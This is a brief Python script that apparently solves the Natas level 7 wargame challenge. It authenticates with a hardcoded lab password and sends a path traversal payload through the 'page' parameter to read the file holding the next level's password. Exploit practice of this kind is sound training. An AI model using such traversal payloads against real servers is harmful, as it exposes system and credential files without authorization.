
#!/bin/env python
 
import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/' % username 

#cookies = {"loggedin" : "1"}

session = requests.Session()
response = session.post(url + 'index.php?page=../../../../etc/natas_webpass/natas8', auth = (username, password))
#request = requests.get(url, auth = (username, password))
content = response.text
print content
#print re.findall('natas4:(.*)', content)[0]


